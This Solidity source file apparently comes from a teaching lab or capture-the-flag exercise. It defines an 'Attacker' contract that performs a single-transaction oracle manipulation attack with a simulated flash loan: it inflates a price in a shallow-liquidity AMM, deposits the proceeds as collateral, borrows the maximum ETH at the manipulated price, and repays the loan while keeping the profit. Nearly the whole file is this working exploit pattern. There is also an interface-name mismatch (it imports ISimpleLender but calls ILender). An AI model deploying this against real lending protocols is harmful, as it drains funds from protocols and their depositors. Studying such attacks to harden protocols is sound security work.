//SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "./interfaces/IERC20.sol";
import "./interfaces/ISimpleAMM.sol";
import "./interfaces/ISimpleLender.sol";

/**
 * @title Attacker
 * @notice Executes a single-transaction oracle manipulation attack using a simulated flash loan.
 * @dev Attack flow:
 *   1. Receives ETH (simulated flash loan) via payable executeAttack()
 *   2. Swaps ETH into shallow-liquidity AMM, inflating USDC/ETH price
 *   3. Deposits received USDC as collateral into the lending protocol
 *   4. Borrows maximum ETH at the manipulated oracle price
 *   5. Repays the flash loan, keeping the profit
 */
contract Attacker {
    function executeAttack(
        address amm,
        address usdc,
        address lender
    ) external payable {
        // Simulate flash loan of 2 ETH from caller
        require(address(this).balance >= 2e18, "not enough funds");

        // Step 1: Swap 2 ETH for USDC in shallow-liquidity AMM
        // This massively inflates the USDC/ETH price in the AMM
        uint256 usdcReceived = ISimpleAMM(amm).swap{value: msg.value}(
            address(0),
            msg.value
        );

        // Step 2: Deposit USDC as collateral into the lending protocol
        IERC20(usdc).approve(lender, usdcReceived);
        ILender(lender).depositUSDC(usdcReceived);

        // Step 3: Borrow maximum ETH using the manipulated oracle price
        uint256 amount = ILender(lender).maxBorrowAmount();
        ILender(lender).borrowETH(amount);

        // Step 4: Repay flash loan (2 ETH) to caller, keep profit
        (bool success, ) = msg.sender.call{value: msg.value}(new bytes(0));
        require(success, "Failed to transfer ETH");
    }

    receive() external payable {}
}
